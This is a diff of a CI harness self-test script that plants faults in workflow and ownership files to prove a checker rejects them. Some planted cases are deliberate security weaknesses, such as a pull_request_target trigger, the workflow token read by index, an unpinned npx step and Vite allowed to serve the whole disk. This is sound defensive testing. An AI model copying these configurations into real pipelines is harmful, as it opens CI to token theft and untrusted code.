+    (G, "\njobs:\n", "\n\"on\":\n  pull_request_target:\njobs:\n", "a second events block"),
+    (G, "  unit:\n    needs: [changes]\n    if: needs.changes.outputs.ts == 'true'\n", "  unit:\n    needs: [changes]\n    if: needs.changes.outputs.ui == 'true'\n", "a job run on a flag gate-ok does not read"),
+    (G, "      ts: ${{ steps.diff.outputs.ts }}\n", "      tss: ${{ steps.diff.outputs.ts }}\n", "an output misspelled"),
+    (G, "  group: gate-${{ github.event.pull_request.number || (github.event_name == 'push' && github.run_id) || github.ref }}\n", "  group: gate\n", "one group for every run"),
+    (G, "  group: gate-${{ github.event.pull_request.number || (github.event_name == 'push' && github.run_id) || github.ref }}\n", "  group: gate-${{ github.event.pull_request.number || github.ref }}\n", "main's runs in one group, a pending one cancelled"),
+    (G, "  group: gate-${{ github.event.pull_request.number || (github.event_name == 'push' && github.run_id) || github.ref }}\n", "  group: gate-${{ github.event.pull_request.number || github.run_id }}\n", "runs by hand each in a group of their own"),
+    (O, "/app/src/cspForms.ts @alexiscolin\n", "/app/src/cspForms.ts @alexiscolin\n/scripts/ci_gate_ok.py\n", "a later line with no owner"),
+    (O, "/app/src/cspForms.ts @alexiscolin\n", "/app/src/cspForms.ts @alexiscolin\n* @someone\n", "a last line owning everything for another"),
+    (G, "*) BASE=$(git merge-base origin/main HEAD) ;;", "*) BASE=$(git rev-parse HEAD) ;;", "a run by hand judged against itself"),
+    (N, " --app github-actions", "", "the night comments on anyone's issue"),
+    (N, "--strip-components=1 package/pnpm", "--strip-components=1 package", "the night's pnpm step drifts from the gate's"),
+    (N, '        name: Ergo, the one the tests start (built from deploy/ergo/VERSION)\n', "        name: Ergo\n", "the night's Ergo step drifts from the gate's"),
+    (N, "      - *chromium\n      - name: harness_mutate.py", "      - &pnpm\n        name: x\n        run: echo\n      - *chromium\n      - name: harness_mutate.py", "an anchor defined twice"),
+    (JS, '".github/workflows/**"', '".github/workflows/**",\n    "scripts/**"', "jscpd widened to the scripts"),
+    (G, "SKIP=missing_picture,tokens_pictures python3", "SKIP=missing_picture,tokens_pictures,lint python3", "the gate's probe skips a guard"),
+    (N, "SKIP=missing_picture,tokens_pictures python3", "SKIP=missing_picture,tokens_pictures,lint python3", "the night's probe skips a guard"),
+    (G, "--grep-invert 'a flash raised from a dialog shows above its scrim, at the top centre$'", "--grep-invert 'a flash'", "the stories' exclusion widened"),
+    (G, "--ignore-snapshots --retries=1 --reporter=dot", "--ignore-snapshots --retries=1 --pass-with-no-tests --reporter=dot", "the journeys pass with no test"),
+    (G, "--reporter=dot app/tests/e2e/login.spec.ts", "--reporter=dot --grep chat app/tests/e2e/login.spec.ts", "the journeys picked by a --grep"),
+    (B, 'test("a flash raised from a dialog shows above its scrim, at the top centre"', 'test("the flash shows above its scrim"', "the left-out test renamed, the exclusion empty"),
+    (B, 'test("a flash raised from a dialog shows above its scrim, at the top centre"', 'test.describe("a flash raised from a dialog shows above its scrim, at the top centre", () => {});\ntest("a flash raised from a dialog shows above its scrim, at the top centre"', "the phrase on a second title"),
+    (B, "expect(await pill.screenshot()).toEqual(alone);", "await expect(page).toMatchAriaSnapshot(\"x\");", "a snapshot --ignore-snapshots would pass"),
+    (V, "[realpathSync(STORE)]", '[realpathSync(STORE), "/"]', "Vite allowed the whole disk"),
+    (O, "/link-reader/package.json @alexiscolin\n", "", "a workspace package with no owner"),
+    (G, 'pull_request) BASE=$(git merge-base "origin/$BASE_REF" HEAD) ;;', "pull_request) BASE=$(git rev-parse HEAD) ;;", "a base that is the change itself"),
+    (G, "        run: python3 -I scripts/check_css.py\n", "        run: python3 -I scripts/check_css.py\n      - env:\n          T: ${{ github['token'] }}\n        run: echo\n", "the token by index"),
+    (G, "      - name: The CSS rules\n", "      - uses: ./.github/actions/x\n      - name: The CSS rules\n", "a local action"),
+    (G, "    if: always()\n", "", "gate-ok skipped after a failure"),
+    (G, "        run: python3 -I scripts/audit.py\n", "        run: npx audit-ci\n", "npx"),
+    (N, ", gno-mutants, deploy-mutants]", ", gno-mutants]", "a night job no report reads"),
+    (N, '        run: pnpm exec stryker run --concurrency "$(nproc)"\n', '        run: pnpm exec stryker run --concurrency "$(nproc)" --mutate app/src/csp.ts\n', "a night Stryker on one file"),
+    (O, "/scripts/ @alexiscolin\n", "", "a judge with no owner"),
+    (O, "/deploy/ @alexiscolin\n", "/deploy/ @someone\n", "the deploy owned by another"),
+    (K, '    "zizmor": [],\n', "", "a job ci_gate_ok.py does not judge"),
+]
+def copy_of(name):
+    copy = plant / name
+    for part in (".github", "package.json", ".jscpd.json", "vitest.config.ts", "app/tests", "scripts/ci_gate_ok.py", "scripts/ci_changes.sh",
+                 "scripts/check.sh", ".githooks/records.sh", "link-reader/package.json"):
+        (copy / part).parent.mkdir(parents=True, exist_ok=True)
+        (shutil.copytree if (root / part).is_dir() else shutil.copy)(root / part, copy / part)
+    return copy
+# The control: an unplanted copy passes, or every plant below would fail for want of a file and prove nothing.
+r = subprocess.run([sys.executable, "-I", checker, str(copy_of("control"))], capture_output=True, text=True)
+assert r.returncode == 0, f"the workflows' checker fails an unplanted copy: {(r.stdout + r.stderr)[-400:]}"
+for n, (path, find, replace, why) in enumerate(CASES):
+    copy = copy_of(str(n))
+    text = (copy / path).read_text()
+    assert find in text, f"the planted case '{why}' no longer finds its text in {path}"
+    (copy / path).write_text(text.replace(find, replace, 1))
+    r = subprocess.run([sys.executable, "-I", checker, str(copy)], capture_output=True, text=True)
+    assert r.returncode != 0, f"the workflows' checker passed {why}"
+PY
+# probe.py's SKIP, which the gate and the night use: an unknown name fails the run, a real one does not, and a skipped block
+# never runs (ONLY naming it then finds it not run). No block runs in these: ONLY names none of the first two.
+skipped() { (cd "$here/.." && ONLY="$1" SKIP="$2" python3 -I scripts/probe.py 2>&1); }
+skipped no_such_block ghost | grep -q "SKIP names no block: ghost" || fail "probe.py took a SKIP that names no block"
+skipped no_such_block lint | grep -q "SKIP names no block" && fail "probe.py refused a SKIP that names a real block"
+skipped no_such_block lint | grep -q "left out by SKIP: lint" || fail "probe.py did not say what SKIP left out"
+skipped prettier prettier | grep -q "ONLY names no block: prettier" || fail "probe.py ran a block SKIP names"
+# zizmor's own proof, as gate.yml runs it: with a zizmor that lets everything through, or refuses for another reason, it fails.
+python3 -I - "$here/../.github/workflows/gate.yml" "$t/zproof.sh" <<'PY' || fail "gate.yml's zizmor proof step is gone"
+import re, sys
+text = open(sys.argv[1]).read()
+at = text.index("      - name: zizmor refuses ")
+m = re.compile(r"^        run: \|\n((?:          .*\n|\n)+)", re.M).search(text, at)
+open(sys.argv[2], "w").write("\n".join(l[10:] for l in m.group(1).split("\n")))
+PY
+z="$t/zrt/zizmor/bin" && mkdir -p "$z"
+printf '#!/bin/sh\nexit 0\n' >"$z/zizmor" && chmod +x "$z/zizmor"
+RUNNER_TEMP="$t/zrt" sh "$t/zproof.sh" >/dev/null 2>&1 && fail "gate.yml's zizmor proof passed a zizmor that refuses nothing"
+printf '#!/bin/sh\necho something else\nexit 14\n' >"$z/zizmor"
+RUNNER_TEMP="$t/zrt" sh "$t/zproof.sh" >/dev/null 2>&1 && fail "gate.yml's zizmor proof passed a zizmor that refuses for another reason"
+printf '#!/bin/sh\necho "error[dangerous-triggers] warning[excessive-permissions]"\nexit 14\n' >"$z/zizmor"
+RUNNER_TEMP="$t/zrt" sh "$t/zproof.sh" >"$t/zproof.out" 2>&1 || fail "gate.yml's zizmor proof failed a zizmor that refuses each planted workflow: $(cat "$t/zproof.out")"
+# The detector, run as gate.yml's `changes` runs it: from the base's tree, in the change's checkout, which it leaves as it was.
+c="$t/ci" && mkdir -p "$c/repo" && cd "$c/repo" && git init -q && git config core.hooksPath /dev/null
+mkdir -p docs scripts .githooks server/src deploy app/src
+cp "$here/ci_changes.sh" "$here/speeds.py" "$here/repo_files.py" "$here/hidden.py" scripts/ && cp "$hooks/records.sh" .githooks/
+printf '| Tier | What it holds | Who |\n|---|---|---|\n| 1 | Rights (`server/src/guard.ts`, `server/src/other.ts`, `docs/rights.md`) | Claude |\n| 3 | Interface: `app/src/look/` | Claude |\n' >docs/REVIEW.md
+printf 'x\n' >server/src/guard.ts && printf 'x\n' >app/src/a.ts && printf 'x\n' >docs/rights.md && printf '{"mutate": ["server/src/**/*.ts"]}\n' >stryker.config.json
+git add -A && git commit -qm base && base=$(git rev-parse HEAD)
+git archive "$base" scripts docs/REVIEW.md .githooks | (mkdir -p "$c/base" && tar -x -C "$c/base")
+changes() { (cd "$c/repo" && sh "$c/base/scripts/ci_changes.sh" "$@") >"$c/out" 2>"$c/err"; }
+judge() { changes "$@" || fail "ci_changes.sh failed on $*: $(cat "$c/err")"; [ -z "$(cd "$c/repo" && git status --porcelain)" ] || fail "ci_changes.sh wrote in the checkout"; }
+is() { grep -qx "$1" "$c/out" || fail "ci_changes.sh: $2: no $1 in $(tr '\n' ' ' <"$c/out") $(cat "$c/err")"; }
+change() { (cd "$c/repo" && git checkout -qf "$base" && git checkout -qf -B change && eval "$1" && git add -A && git commit -qm change); }
+flags="product ts app gno deploy ui nginx migrations harness tier1"
+change 'printf "y\n" >docs/x.md'
+judge pull_request "$base" "$c/base"
+for f in $flags; do is "$f=false" "prose alone"; done
+is "base=$base" "prose alone"
+for case in 'deploy/x:deploy=true gno=false' 'gno/r/x:gno=true deploy=false' 'scripts/new.py:harness=true product=false ts=false' \
+	'app/src/b.ts:product=true ts=true app=true nginx=true tier1=false ui=false' 'pnpm-lock.yaml:ts=true app=true nginx=true harness=true' \
+	'server/src/m.ts:migrations=true ts=true product=true app=false' 'packages/ui/x.ts:ui=true app=true' 'app/src/p.md:product=true' \
+	'.github/workflows/gate.yml:harness=true product=false' 'docs/rights.md:tier1=true product=false'; do
+	path=${case%%:*}
+	change "mkdir -p '$(dirname "$path")' && printf 'y\n' >'$path'"
+	judge pull_request "$base" "$c/base"
+	for want in ${case#*:}; do is "$want" "a change of $path"; done
+done
+change 'mkdir -p gno/r deploy/web && printf "y\n" >"$(printf "gno/r/a\tb")" && printf "y\n" >"$(printf "deploy/web/x\ty")"'
+judge pull_request "$base" "$c/base" && is gno=true "a gno/ name git quotes" && is deploy=true "a deploy/ name git quotes"
+change 'printf "y\n" >server/src/guard.ts'
+judge push "$base" "$c/base" && is tier1=true "a tier-1 file"
+# Test 10: a change that strikes its path from the tier table is judged by the base's table.
+change 'printf "y\n" >server/src/guard.ts && printf "| Tier | What it holds | Who |\n|---|---|---|\n| 1 | Rights (\`server/src/other.ts\`) | Claude |\n| 3 | Interface: \`app/src/look/\` | Claude |\n" >docs/REVIEW.md'
+judge pull_request "$base" "$c/base" && is tier1=true "a tier-1 path struck from the change's own table"
+# A tier-1 file moved out is still a change to it, and a link leads anywhere.
+change 'git mv server/src/guard.ts docs/guard.md'
+judge pull_request "$base" "$c/base" && is tier1=true "a tier-1 file renamed away"
+change 'mkdir -p app/src/look && ln -s ../../../server/src/guard.ts app/src/look/l.ts'
+judge pull_request "$base" "$c/base" && is tier1=true "a link to a tier-1 file"
+# By hand, or on an event it does not know, every job runs.
+change 'printf "y\n" >docs/y.md'
+for event in workflow_dispatch pull_request_target; do
+	judge "$event" "$base" "$c/base"
+	for f in $flags; do is "$f=true" "an event of $event"; done
+done
+# What the base lacks, or a script of it that fails, calls for the job (F113, F116, F125).
+mv "$c/base/.githooks/records.sh" "$c/records.sh"
+judge pull_request "$base" "$c/base" && is harness=true "a base with no harness list"
+mv "$c/records.sh" "$c/base/.githooks/records.sh" && mv "$c/base/scripts/speeds.py" "$c/speeds.py"
+judge pull_request "$base" "$c/base" && is tier1=true "a base with no speeds.py"
+mv "$c/speeds.py" "$c/base/scripts/speeds.py" && mv "$c/base/docs/REVIEW.md" "$c/REVIEW.md"
+judge pull_request "$base" "$c/base" && is tier1=true "a base with no tier table"
+mv "$c/REVIEW.md" "$c/base/docs/REVIEW.md"
+changes pull_request 0000000000000000000000000000000000000000 "$c/base" && fail "ci_changes.sh judged a change against a base git does not have"
+cd "$here/.."
+# The verdict: every job passed, or was skipped because the change did not call for it, by a table written apart from REQUIRED.
+python3 -I - "$here" <<'PY' || fail "ci_gate_ok.py lets a gate pass that must fail, or the reverse"
+import sys
+sys.path.insert(0, sys.argv[1])
+sys.dont_write_bytecode = True
+from ci_gate_ok import verdict
+CALLS = {"types": {"ts"}, "unit": {"ts"}, "unit-browser": {"ts"}, "journeys": {"app"}, "build": {"app"}, "gno-go": {"gno"},
+         "coverage": {"tier1", "product"}, "risk": {"tier1", "product"}, "deploy-stack": {"deploy"},
+         "harness-selftest": {"harness"}, "lint": set(), "zizmor": set(), "regressions": set()}
+FLAGS = ["product", "ts", "app", "gno", "deploy", "ui", "nginx", "migrations", "harness", "tier1"]
+def run(on=(), results=None, event="pull_request", changed=(), outputs=None, drop=()):
+    out = {"base": "b" * 40, **{f: "true" if f in on else "false" for f in FLAGS}, **(outputs or {})}
+    needs = {"changes": {"result": "success", "outputs": out}}
+    for job, flags in CALLS.items():
+        if job not in drop:
+            needs[job] = {"result": "success" if flags <= set(on) else "skipped"}
+    for job, result in (results or {}).items():
+        needs[job] = {"result": result}
+    return verdict(needs, event, list(changed) if changed is not None else None)
+assert run() == [], f"a prose change's gate failed: {run()}"
+assert run(on={"ts", "app", "product"}, changed=["app/a.ts"]) == []
+for job, flags in CALLS.items():
+    assert run(on=flags, results={job: "skipped"}), f"{job} skipped, though {sorted(flags) or 'every change'} calls for it, passed the gate"
+    for result in ("failure", "cancelled", "neutral"):
+        assert run(on=flags, results={job: result}), f"a {result} {job} passed the gate"
+# Test 9: a `changes` that says no deploy/ or gno/ change does not skip their jobs.
+assert run(changed=["deploy/test.sh"]), "a deploy/ change passed with deploy-stack skipped"
+assert run(changed=["gno/r/x"]), "a gno/ change passed with gno-go skipped"
+assert run(changed=["deploy/x"], results={"deploy-stack": "success"}) == []
+assert run(changed=None), "a gate passed with git unable to list the change"
+assert run(changed=None, results={"deploy-stack": "success", "gno-go": "success"}), "a gate passed with git unable to list the change"
+assert run(event="workflow_dispatch"), "a manual run passed with jobs skipped"
+assert run(drop=["regressions"]), "a gate passed without one of its jobs"
+assert run(results={"changes": "failure"}), "a gate passed with no detector"
+assert run(outputs={"base": ""}), "a gate passed with no base"
+assert run(outputs={"ts": ""}) and run(outputs={"ts": "maybe"}), "a gate passed with a flag read as neither true nor false"
+missing = {"changes": {"result": "success", "outputs": {"base": "b" * 40}}, **{j: {"result": "skipped"} for j in CALLS}}
+assert verdict(missing, "pull_request", []), "a gate passed with no flag read at all"
+assert run(results={"extra": "failure"}), "a failed job ci_gate_ok.py does not know passed the gate"
+assert run(results={"extra": "skipped"}) == []
+PY
+# Its main() asks git for the change itself: a deploy/ change with deploy-stack skipped fails, the same with deploy-stack passed does not.
+g="$t/ci_ok" && mkdir -p "$g" && cd "$g" && git init -q && git config core.hooksPath /dev/null && printf 'x\n' >a && git add a && git commit -qm base
+gbase=$(git rev-parse HEAD) && mkdir deploy && printf 'y\n' >"$(printf 'deploy/x\ty')" && git add deploy && git commit -qm deploy
+needs() { python3 -I -c 'import json, sys
+calls = {"types": "ts", "unit": "ts", "unit-browser": "ts", "journeys": "app", "build": "app", "gno-go": "gno", "coverage": "tier1",
+         "risk": "tier1", "deploy-stack": "deploy", "harness-selftest": "harness", "lint": "", "zizmor": "", "regressions": ""}
+flags = ["product", "ts", "app", "gno", "deploy", "ui", "nginx", "migrations", "harness", "tier1"]
+n = {"changes": {"result": "success", "outputs": {"base": sys.argv[1], **{f: "false" for f in flags}}}}
+n.update({j: {"result": "skipped" if f else "success"} for j, f in calls.items()})
+n["deploy-stack"]["result"] = sys.argv[2]
+print(json.dumps(n))' "$gbase" "$1"; }
+NEEDS=$(needs skipped) python3 -I "$here/ci_gate_ok.py" pull_request >"$t/ok.out" 2>&1 && fail "ci_gate_ok.py passed a deploy/ change git shows, a name it quotes, with deploy-stack skipped"
+NEEDS=$(needs success) python3 -I "$here/ci_gate_ok.py" pull_request >"$t/ok.out" 2>&1 || fail "ci_gate_ok.py failed a gate whose every job passed: $(cat "$t/ok.out")"
+NEEDS=$(needs success) python3 -I "$here/ci_gate_ok.py" >/dev/null 2>&1 && fail "ci_gate_ok.py passed with no event"
+cd "$here/.."
 fi
 
 [ -z "${ONLY:-}" ] || [ "${ran:-}" = 1 ] || fail "ONLY=$ONLY names no section"
